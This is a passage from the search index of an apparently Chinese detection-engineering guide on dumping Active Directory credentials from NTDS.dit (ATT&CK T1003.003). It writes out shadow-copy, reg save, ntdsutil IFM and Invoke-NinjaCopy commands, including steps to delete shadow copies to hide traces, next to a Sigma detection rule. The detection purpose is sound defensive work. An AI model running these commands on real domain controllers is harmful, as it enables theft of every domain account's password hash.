6\u8005\u4f7f\u7528\u50cfHashcat\u8fd9\u6837\u7684\u5de5\u5177\u6765\u7834\u89e3\u8fd9\u4e9b\u5bc6\u7801\u3002\u8fd9\u4e9b\u5bc6\u7801\u7684\u63d0\u53d6\u548c\u7834\u89e3\u53ef\u4ee5\u79bb\u7ebf\u6267\u884c\uff0c\u56e0\u6b64\u65e0\u6cd5\u68c0\u6d4b\u5230\u3002\u4e00\u65e6\u653b\u51fb\u8005\u63d0\u53d6\u4e86\u8fd9\u4e9b\u54c8\u5e0c\u503c\uff0c\u4ed6\u4eec\u5c31\u53ef\u4ee5\u5145\u5f53\u57df\u4e2d\u7684\u4efb\u4f55\u7528\u6237\uff0c\u5305\u62ec\u57df\u7ba1\u7406\u5458\u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u5de5\u5177\u548c\u6280\u672f\u679a\u4e3eNTDS\u6587\u4ef6\u548c\u6574\u4e2aActive Directory\u54c8\u5e0c\u7684\u5185\u5bb9\uff1a</p> <ul> <li>\u4f7f\u7528 NTDSUtil \u521b\u5efa IFM \u6293\u53d6 DC \u672c\u5730\u7684 Ntds.dit \u6587\u4ef6\u3002</li> <li>\u4f7f\u7528 VSS \u5377\u5f71\u590d\u5236\u8fdc\u7a0b\u8bfb\u53d6 Ntds.dit\u3002</li> <li>\u4f7f\u7528 PowerSploit \u7684 Invoke-NinjaCopy \u8fdc\u7a0b\u8bfb\u53d6 Ntds.dit\uff08\u9700\u8981\u76ee\u6807 DC \u542f\u7528 PowerShell \u8fdc\u7a0b\u7ba1\u7406\uff09\u3002</li> <li>\u5728 DC \u4e2d\u4f7f\u7528 Mimikatz \u8f6c\u50a8 Active Directory \u51ed\u636e\u3002</li> <li>\u5728 DC \u4e2d\u4f7f\u7528 Invoke-Mimikatz \u8f6c\u50a8 Active Directory \u51ed\u636e\u3002</li> <li>\u4f7f\u7528 Invoke-Mimikatz \u8fdc\u7a0b\u8f6c\u50a8 Active Directory \u51ed\u636e\u3002</li> <li>\u4f7f\u7528 Mimikatz \u7684 DCSync \u529f\u80fd\u8fdc\u7a0b\u8f6c\u50a8 Active Directory \u51ed\u636e\u3002</li> </ul> <p>\u6ce8\u610f\uff1a\u5982\u679c\u5df2\u7ecf\u53d1\u73b0\u4e86 Active Directory \u6570\u636e\u5e93\uff08NTDS.DIT\uff09\u7684\u526f\u672c\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u65e0\u9700\u63d0\u5347\u6743\u9650\u5373\u53ef\u4ece\u4e2d\u8f6c\u50a8\u51ed\u636e\u3002</p> <p>\u8c01\u53ef\u4ee5\u8bbf\u95ee\uff1f</p> <pre><code>    Enterprise Admins (\u76ee\u5f55\u6797\u7ba1\u7406\u5458\u7ec4)\n    Domain Admins(\u57df\u7ba1\u7406\u5458\u7ec4)\n    Administrators(\u7ba1\u7406\u5458\u7ec4)\n    Backup Operators(\u5907\u4efd\u64cd\u4f5c\u6210\u5458)\n    Account Operators(\u8d26\u6237\u7ba1\u7406\u7ec4)\n    Print Operators(\u6253\u5370\u673a\u64cd\u4f5c\u7ec4)\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-NTDS.dit-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows sysmon\u65e5\u5fd7</p> <p>Invoke-NinjaCopy -Path \u201cc:\\windows\\ntds\\ntds.dit\u201d -LocalDestination \u201cc:\\windows\\temp\\ntds.dit\u201c</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-NTDS.dit-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u4e00\u65e6\u6211\u4eec\u83b7\u5f97\u4e86\u57df\u7ba1\u7406\u8bbf\u95ee\u6743\uff0c\u4ece DC \u4e2d\u63d0\u53d6\u6240\u6709\u54c8\u5e0c\u7684\u8001\u65b9\u6cd5\u5c31\u662f\u5728\u57df\u63a7\u5236\u5668\u4e0a\u8fd0\u884c\u547d\u4ee4\uff0c\u5e76\u4f7f\u7528 Shadow Volume \u6216\u539f\u59cb\u62f7\u8d1d\u6280\u672f\u63d0\u53d6 ntds.dit \u6587\u4ef6\u3002</p> <p>\u78c1\u76d8\u5377\u5f71\u590d\u5236\u6280\u672f</p> <p>\u7531\u4e8e\u6211\u4eec\u786e\u5b9e\u53ef\u4ee5\u8bbf\u95ee\u6587\u4ef6\u7cfb\u7edf\uff0c\u5e76\u4e14\u53ef\u4ee5\u4f5c\u4e3a\u653b\u51fb\u8005\u5728\u57df\u63a7\u5236\u5668\u4e0a\u8fd0\u884c\u547d\u4ee4\uff0c\u56e0\u6b64\u6211\u4eec\u5e0c\u671b\u83b7\u53d6\u5b58\u50a8\u5728 ntds.dit \u6587\u4ef6\u4e2d\u7684\u6240\u6709\u57df\u5185\u54c8\u5e0c\u3002\u4e0d\u5e78\u7684\u662f\uff0c\u8be5\u6587\u4ef6\u4e0d\u65ad\u5730\u88ab\u8bfb\u548c\u5199\uff0c\u5373\u4f7f\u4f5c\u4e3a\u7cfb\u7edf\uff0c\u6211\u4eec\u4e5f\u65e0\u6cd5\u8bfb\u53d6\u6216\u590d\u5236\u8be5\u6587\u4ef6\u3002\u5e78\u8fd0\u7684\u662f\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u540d\u4e3a Volume Shadow Copy Service \u78c1\u76d8\u590d\u5236\u670d\u52a1\uff08VSS\uff09\u7684 Windows \u529f\u80fd\uff0c\u8be5\u529f\u80fd\u5c06\u521b\u5efa\u78c1\u76d8\u7684\u5feb\u7167\u526f\u672c\u3002\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u4ece\u8be5\u526f\u672c\u4e2d\u8bfb\u53d6 Ntds.dit \u6587\u4ef6\u5c06\u5176\u83b7\u53d6\u51fa\u6765\u3002\u5e76\u5c06\u5176\u4ece\u8ba1\u7b97\u673a\u4e0a\u53d6\u6d88\uff0c\u8fd9\u5305\u62ec\u7a83\u53d6 Ntds.dit\u3001System\u3001SAM \u548c Boot Key \u6587\u4ef6\u3002\u6700\u540e\uff0c\u6211\u4eec\u9700\u8981\u6e05\u7406\u6211\u4eec\u7684\u884c\u8e2a\u5e76\u5220\u9664\u78c1\u76d8\u62f7\u8d1d\uff1a</p> <pre><code>- C:\\vssadmin create shadow /for=C:\n- copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[DISK_NUMBER]\\windows\\system32\\config\\SYSTEM\n- copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[DISK_NUMBER]\\windows\\system32\\config\\SAM\n- copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy[DISK_NUMBER]\\windows\\ntds\\ntds.dit\n- reg SAVE HKLM\\SYSTEM c:\\SYS\n- vssadmin list shadows\n- vssadmin delete shadows /for= [/oldest | /all | /shadow=]\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-NTDS.dit-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows sysmon\u65e5\u5fd7 \u8fdb\u7a0b\u521b\u5efa\u3001\u547d\u4ee4\u884c\u53c2\u6570</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-NTDS.dit-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-NTDS.dit-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: VSS\u5377\u5f71\u590d\u5236\u672c\u5730\u8bfb\u53d6Ntds.dit\u6587\u4ef6(\u57df\u63a7\u4e3b\u673a\u64cd\u4f5c\uff0c\u4e5f\u9002\u7528\u4e8eVSS\u5377\u5f71\u590d\u5236\u8fdc\u7a0b\u8bfb\u53d6Ntds.dit\u6587\u4ef6)\ndescription: windows server 2008 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c\nreferences: https://1sparrow.com/2018/02/19/\u57df\u6e17\u900f\u76f8\u5173/\ntags: T1003-003\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection1:\n        EventID: 1  # \u8fdb\u7a0b\u521b\u5efa\n        Image: 'C:\\Windows\\System32\\vssadmin.exe'\n        CommandLine: 'VSSADMIN.EXE'\n        CurrentDirectory: 'vssadmin  create shadow /for=C:'\n    selection2:\n        EventID: 1\n        Image: 'C:\\Windows\\System32\\reg.exe'\n        CommandLine: 'reg.exe'\n        CurrentDirectory: 'reg  SAVE HKLM\\SYSTEM *'\n    selection3:\n        EventID: 1  # \u8fdb\u7a0b\u521b\u5efa\n        Image: 'C:\\Windows\\System32\\vssadmin.exe'\n        CommandLine: 'VSSADMIN.EXE'\n        CurrentDirectory: 'vssadmin  delete shadows /all'\n    condition: selection1 or selection2 or selection3\nlevel: medium\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-NTDS.dit-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-NTDS.dit-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1003-003</p> <p>https://attack.mitre.org/techniques/T1003/003</p> <p>\u4ece\u6d3b\u52a8\u76ee\u5f55\u4e2d\u83b7\u53d6\u57df\u7ba1\u7406\u5458\u6743\u9650\u76846\u79cd\u65b9\u6cd5</p> <p>https://www.4hou.com/technology/4256.html</p> <p>\u5982\u4f55\u5de7\u5999\u7684\u4ecentds.dit\u4e2d\u63d0\u53d6Hash\u548c\u57df\u4fe1\u606f</p> <p>https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E8%8E%B7%E5%BE%97%E5%9F%9F%E6%8E%A7%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84NTDS.dit%E6%96%87%E4%BB%B6/</p> <p>\u57df\u6e17\u900f\u2014\u2014\u83b7\u5f97\u57df\u63a7\u670d\u52a1\u5668\u7684NTDS.dit\u6587\u4ef6</p> <p>https://xz.aliyun.com/t/2187</p> <p>\u4eceNTDS.dit\u83b7\u53d6\u5bc6\u7801hash\u7684\u4e09\u79cd\u65b9\u6cd5</p> <p>https://www.freebuf.com/sectool/176876.html</p> <p>\u4eceNTDS.dit\u6587\u4ef6\u4e2d\u63d0\u53d6\u5bc6\u7801\u54c8\u5e0c\u503c</p> <p>https://blog.stealthbits.com/extracting-password-hashes-from-the-ntds-dit-file/</p> <p>\u653b\u51fb\u8005\u5982\u4f55\u8f6c\u50a8AD\u6570\u636e\u5e93\u51ed\u636e</p> <p>https://adsecurity.org/?p=2398</p> <p>\u5728AD\u4e2d\u83b7\u5f97\u57df\u7ba1\u7406\u5458\u6743\u9650\u7684\u653b\u51fb\u65b9\u6cd5</p> <p>https://adsecurity.org/?p=2362</p> <p>\u5f3a\u529b\u63a8\u8350</p> <p>\u8f6c\u50a8\u6d3b\u52a8\u76ee\u5f55\u6570\u636e\u5e93\u65b9\u6cd5\u603b\u7ed3</p> <p>http://ju.outofmemory.cn/entry/232676</p> <p>powershell\u5f00\u542f\u8fdc\u7a0b\u7ba1\u7406\u7684\u65b9\u6cd5\u8bf7\u53c2\u8003</p> <p>https://blog.51cto.com/1163739403/1826546</p> <p>\u5377\u5f71\u590d\u5236NTDS.dit\u57df\u6563\u5217\u8fdc\u7a0b-\u7b2c1\u90e8\u5206</p> <p>https://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/</p> <p>\u4eceNTDS.dit\u6587\u4ef6\u83b7\u53d6\u54c8\u5e0c</p> <p>https://www.swordshield.com/blog/getting-hashes-from-ntds-dit-file/</p> <p>\u8f6c\u50a8\u6d3b\u52a8\u76ee\u5f55\u6570\u636e\u5e93\u51ed\u8bc1\u7684\u65b9\u6cd5\u603b\u7ed3</p> <p>https://blog.csdn.net/weixin_33713707/article/details/87980463</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-ntds%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/","title":"T1003-003-windows-\u57fa\u4e8eNTDS\u51ed\u8bc1\u8f6c\u50a82","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-ntds%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u8bbf\u95ee\u6216\u521b\u5efaActive Directory\u57df\u6570\u636e\u5e93\u7684\u526f\u672c\uff0c\u4ee5\u4fbf\u7a83\u53d6\u51ed\u636e\u4fe1\u606f\uff0c\u4ee5\u53ca\u83b7\u53d6\u6709\u5173\u57df\u6210\u5458\uff08\u4f8b\u5982\u8bbe\u5907\uff0c\u7528\u6237\u548c\u8bbf\u95ee\u6743\u9650\uff09\u7684\u5176\u4ed6\u4fe1\u606f\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\uff08NTDS.dit\uff09\u4f4d\u4e8e%SystemRoot%\\NTDS\\Ntds.dit\u57df\u63a7\u5236\u5668\u4e2d\u3002</p> <p>\u9664\u4e86\u5728\u6d3b\u52a8\u7684\u57df\u63a7\u5236\u5668\u4e0a\u67e5\u627eNTDS\u6587\u4ef6\u4e4b\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u641c\u7d22\u5305\u542b\u76f8\u540c\u6216\u76f8\u4f3c\u4fe1\u606f\u7684\u5907\u4efd\u3002</p> <p>\u4e0b\u5217\u5de5\u5177\u548c\u6280\u672f\u53ef\u7528\u4e8e\u679a\u4e3eNTDS\u6587\u4ef6\u548c\u6574\u4e2aActive Directory\u54c8\u5e0c\u7684\u5185\u5bb9\u3002</p> <p>\u5377\u5f71\u590d\u5236</p> <p>secretsdump.py</p> <p>\u4f7f\u7528\u5185\u7f6e\u7684Windows\u5de5\u5177ntdsutil.exe</p> <p>\u8c03\u7528\u5377\u5f71\u526f\u672c</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-ntds%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/#ntdsdit","title":"NTDS.dit","text":"<p>Ntds.dit\u6587\u4ef6\u662f\u5b58\u50a8Active Directory\u6570\u636e\u7684\u6570\u636e\u5e93\uff0c\u5305\u62ec\u6709\u5173\u7528\u6237\u5bf9\u8c61\uff0c\u7ec4\u548c\u7ec4\u6210\u5458\u8eab\u4efd\u7684\u4fe1\u606f\u3002\u5b83\u5305\u62ec\u57df\u4e2d\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u503c\u3002\u57df\u63a7\u5236\u5668\uff08DC\uff09\u4e0a\u7684ntds.dit\u6587\u4ef6\u53ea\u80fd\u7531\u53ef\u4ee5\u767b\u5f55\u5230DC\u7684\u7528\u6237\u8bbf\u95ee\u3002\u5f88\u660e\u663e\uff0c\u4fdd\u62a4\u8fd9\u4e2a\u6587\u4ef6\u81f3\u5173\u91cd\u8981\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u5bfc\u81f4\u6574\u4e2a\u57df\u6ca6\u9677\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\u5c06\u4f4d\u4e8e\u57df\u63a7\u5236\u5668\u7684\uff05SystemRoot\uff05\\NTDS\\Ntds.dit\u4e2d\u3002\u4f46\u901a\u5e38\u5b58\u50a8\u5728\u5176\u4ed6\u903b\u8f91\u9a71\u52a8\u5668\u4e0a\u3002AD\u6570\u636e\u5e93\u662f\u4e00\u4e2aJet\u6570\u636e\u5e93\u5f15\u64ce\uff0c\u5b83\u4f7f\u7528\u53ef\u6269\u5c55\u5b58\u50a8\u5f15\u64ce\uff08ESE\uff09\u63d0\u4f9b\u6570\u636e\u5b58\u50a8\u548c\u7d22\u5f15\u670d\u52a1\u3002\u901a\u8fc7ESE\u7ea7\u522b\u7d22\u5f15\uff0c\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d\u5bf9\u8c61\u5c5e\u6027\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-ntds%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u4f7f\u7528NTDSUtil\u521b\u5efaIFM\u6293\u53d6DC\u672c\u5730\u7684Ntds.dit\u6587\u4ef6\u3002</p> <p>NTDSUTIL\u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u5b9e\u7528\u7a0b\u5e8f\uff0c\u5728\u672c\u5730\u5de5\u4f5c\u65f6\u9700\u8981AD\u6570\u636e\u5e93\uff08NTDS.DIT\uff09\u5e76\u652f\u6301\u4e3aDCPROMO\u521b\u5efaIFM\u3002DCPROMO\u5c06\u4f7f\u7528IFM\u4ee5\u201c\u4ece\u5a92\u4f53\u4ecb\u8d28\u4e2d\u5b89\u88c5\u201d\uff0c\u8fd9\u6837\u670d\u52a1\u5668\u5c31\u4e0d\u9700\u8981\u901a\u8fc7\u7f51\u7edc\u4ece\u53e6\u4e00\u53f0 DC \u4e0a\u590d\u5236\u57df\u6570\u636e\u3002\u9002\u7528\u4e8e\uff1aWindows Server 2003\uff0cWindows Server 2003 R2\uff0c\u5e26\u6709SP1\u7684Windows Server 2003\uff0cWindows Server 2008\uff0cWindows Server 2008 R2\u3002</p> <p>Ntdsutil.exe\u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u4e3aActive Directory\u57df\u670d\u52a1\uff08AD DS\uff09\u548cActive Directory\u8f7b\u578b\u76ee\u5f55\u670d\u52a1\uff08AD LDS\uff09\u63d0\u4f9b\u7ba1\u7406\u5de5\u5177\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528ntdsutil\u547d\u4ee4\u6765\u6267\u884cAD DS\u7684\u6570\u636e\u5e93\u7ef4\u62a4\uff0c\u7ba1\u7406\u548c\u63a7\u5236\u5355\u4e2a\u4e3b\u64cd\u4f5c\uff0c\u4ee5\u53ca\u5220\u9664\u4ece\u7f51\u7edc\u4e2d\u5220\u9664\u800c\u672a\u6b63\u786e\u5378\u8f7d\u7684\u57df\u63a7\u5236\u5668\u7559\u4e0b\u7684\u5143\u6570\u636e\u3002\u8be5\u5de5\u5177\u4ec5\u4f9b\u6709\u7ecf\u9a8c\u7684\u7ba1\u7406\u5458\u4f7f\u7528</p> <p>Ntdsutil.exe\u7684\u662f\u5185\u7f6e\u5728Windows Server 2008\u548cWindows Server 2008 R2\u3002\u5982\u679c\u60a8\u5b89\u88c5\u4e86AD DS\u6216AD LDS\u670d\u52a1\u5668\u89d2\u8272\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528\u8be5\u89d2\u8272\u3002\u5982\u679c\u60a8\u5b89\u88c5\u4f5c\u4e3a\u8fdc\u7a0b\u670d\u52a1\u5668\u7ba1\u7406\u5de5\u5177\uff08RSAT\uff09\u4e00\u90e8\u5206\u7684Active Directory\u57df\u670d\u52a1\u5de5\u5177\uff0c\u5b83\u4e5f\u5c06\u53ef\u7528\u3002</p> <pre><code>#!bash\nntdsutil \u201cac i ntds\u201d \u201cifm\u201d \u201ccreate full c:\\temp\u201d q q\n</code></pre> <p>IFM \u662f\u4e00\u4e2a NTDS.dit\u6587\u4ef6\u7684\u526f\u672c\uff0c\u653e\u5728C://temp\u76ee\u5f55\u4e2d\u3002\u5f53\u521b\u5efa\u4e00\u4e2aIFM\u65f6\uff0c\u4e5f\u4f1a\u4ea7\u751f\u5e76\u6302\u8f7d\u4e00\u4e2aVSS\u5feb\u7167\uff0c\u540c\u65f6Ntds.dit\u6587\u4ef6\u548c\u76f8\u5173\u7684\u6570\u636e\u4e5f\u88ab\u590d\u5236\u5230\u76ee\u6807\u6587\u4ef6\u5939\u4e2d\u3002</p> <p>\u8be5\u6587\u4ef6\u53ef\u80fd\u5b58\u50a8\u5728\u4e00\u4e2a\u6b63\u5728promot\u7684\u65b0\u7684DC\u7684\u5171\u4eab\u6587\u4ef6\u5939\u4e2d\uff0c\u4e5f\u53ef\u80fd\u51fa\u73b0\u5728\u8fd8\u6ca1\u6709promot\u7684\u65b0\u7684\u670d\u52a1\u5668\u4e0a\u3002 \u6b64\u670d\u52a1\u5668\u53ef\u80fd\u65e0\u6cd5\u786e\u4fddIFM\u6570\u636e\u7684\u5b89\u5168\uff0c\u5305\u62ec\u590d\u5236Ntds.dit\u6587\u4ef6\u5e76\u63d0\u53d6\u51ed\u8bc1\u6570\u636e\u3002\u8fd9\u4e2a\u547d\u4ee4\u4e5f\u53ef\u4ee5\u901a\u8fc7 WMI \u6216 PowerShell \u8fdc\u7a0b\u6267\u884c\u3002\uff08\u5efa\u8bae\u4f7f\u7528powershell\u6267\u884c\uff0cDOS\u547d\u4ee4\u6267\u884c\u5f02\u5e38\u9519\u8bef\uff09</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-ntds%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-ntds%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>C:\\Windows\\system32\\ntdsutil.exe: ac i ntds\n\u6d3b\u52a8\u5b9e\u4f8b\u8bbe\u7f6e\u4e3a\u201cntds\u201d\u3002\nC:\\Windows\\system32\\ntdsutil.exe: ifm\nifm: create full c:\\temp\n\u6b63\u5728\u521b\u5efa\u5feb\u7167...\n\u6210\u529f\u751f\u6210\u5feb\u7167\u96c6 {ea08df62-9743-4068-aedb-a2c32dfd057f}\u3002\n\u5feb\u7167 {2d92b366-961f-45f0-9202-9aa6f069139f} \u5df2\u4f5c\u4e3a C:\\$SNAP_201911011107_VOLUMEC$\\ \u88c5\u8f7d\n\u5df2\u88c5\u8f7d\u5feb\u7167 {2d92b366-961f-45f0-9202-9aa6f069139f}\u3002\n\u6b63\u5728\u542f\u52a8\u788e\u7247\u6574\u7406\u6a21\u5f0f...\n     \u6e90\u6570\u636e\u5e93: C:\\$SNAP_201911011107_VOLUMEC$\\Windows\\NTDS\\ntds.dit\n     \u76ee\u6807\u6570\u636e\u5e93: c:\\temp\\Active Directory\\ntds.dit\n\n                  Defragmentation  Status (% complete)\n\n          0    10   20   30   40   50   60   70   80   90  100\n          |----|----|----|----|----|----|----|----|----|----|\n          ...................................................\n\n\u6b63\u5728\u590d\u5236\u6ce8\u518c\u8868\u6587\u4ef6...\n\u6b63\u5728\u590d\u5236 c:\\temp\\registry\\SYSTEM\n\u6b63\u5728\u590d\u5236 c:\\temp\\registry\\SECURITY\n\u5feb\u7167 {2d92b366-961f-45f0-9202-9aa6f069139f} \u5df2\u5378\u8f7d\u3002\n\u5728 c:\\temp \u4e2d\u6210\u529f\u521b\u5efa IFM \u5a92\u4f53\u3002\nifm: q\nC:\\Windows\\system32\\ntdsutil.exe: q\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-ntds%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-ntds%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u5efa\u8bae\u9488\u5bf9\u8fdb\u7a0b\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u76d1\u63a7\u3002\u9488\u5bf9\u8fdb\u7a0b\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u76d1\u63a7\u9700\u8981\u7279\u5b9a\u7684\u73af\u5883\uff0c\u6bd4\u5982\u914d\u7f6e\u5ba1\u6838\u7b56\u7565\u3001\u91c7\u96c6sysmon\u65e5\u5fd7\u7b49\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-ntds%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/#_6","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1003-003</p> <p>https://attack.mitre.org/techniques/T1003/003</p> <p>NTDSutil\u7b80\u4ecb</p> <p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753343(v=ws.10)?redirectedfrom=MSDN</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/","title":"T1003-003-win-\u4f7f\u7528vssown.vbs\u83b7\u5f97NTDS.dit\u6587\u4ef6","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u8bbf\u95ee\u6216\u521b\u5efaActive Directory\u57df\u6570\u636e\u5e93\u7684\u526f\u672c\uff0c\u4ee5\u4fbf\u7a83\u53d6\u51ed\u636e\u4fe1\u606f\uff0c\u4ee5\u53ca\u83b7\u53d6\u6709\u5173\u57df\u6210\u5458\uff08\u4f8b\u5982\u8bbe\u5907\uff0c\u7528\u6237\u548c\u8bbf\u95ee\u6743\u9650\uff09\u7684\u5176\u4ed6\u4fe1\u606f\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\uff08NTDS.dit\uff09\u4f4d\u4e8e%SystemRoot%\\NTDS\\Ntds.dit\u57df\u63a7\u5236\u5668\u4e2d\u3002</p> <p>\u9664\u4e86\u5728\u6d3b\u52a8\u7684\u57df\u63a7\u5236\u5668\u4e0a\u67e5\u627eNTDS\u6587\u4ef6\u4e4b\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u641c\u7d22\u5305\u542b\u76f8\u540c\u6216\u76f8\u4f3c\u4fe1\u606f\u7684\u5907\u4efd\u3002</p> <p>\u4e0b\u5217\u5de5\u5177\u548c\u6280\u672f\u53ef\u7528\u4e8e\u679a\u4e3eNTDS\u6587\u4ef6\u548c\u6574\u4e2aActive Directory\u54c8\u5e0c\u7684\u5185\u5bb9\u3002</p> <p>\u5377\u5f71\u590d\u5236</p> <p>secretsdump.py</p> <p>\u4f7f\u7528\u5185\u7f6e\u7684Windows\u5de5\u5177ntdsutil.exe</p> <p>\u8c03\u7528\u5377\u5f71\u526f\u672c</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-vssown.vbs%E8%8E%B7%E5%8F%96NTDS.dit/#ntdsdit","title":"NTDS.dit","text":"<p>Ntds.dit\u6587\u4ef6\u662f\u5b58\u50a8Active Directory\u6570\u636e\u7684\u6570\u636e\u5e93\uff0c\u5305\u62ec\u6709\u5173\u7528\u6237\u5bf9\u8c61\uff0c\u7ec4\u548c\u7ec4\u6210\u5458\u8eab\u4efd\u7684\u4fe1\u606f\u3002\u5b83\u5305\u62ec\u57df\u4e2d\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u503c\u3002\u57df\u63a7\u5236\u5668\uff08DC\uff09\u4e0a\u7684ntds.dit\u6587\u4ef6\u53ea\u80fd\u7531\u53ef\u4ee5\u767b\u5f55\u5230DC\u7684\u7528\u6237\u8bbf\u95ee\u3002\u5f88\u660e\u663e\uff0c\u4fdd\u62a4\u8fd9\u4e2a\u6587\u4ef6\u81f3\u5173\u91cd\u8981\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u5bfc\u81f4\u6574\u4e2a\u57df\u6ca6\u9677\u3002</p> 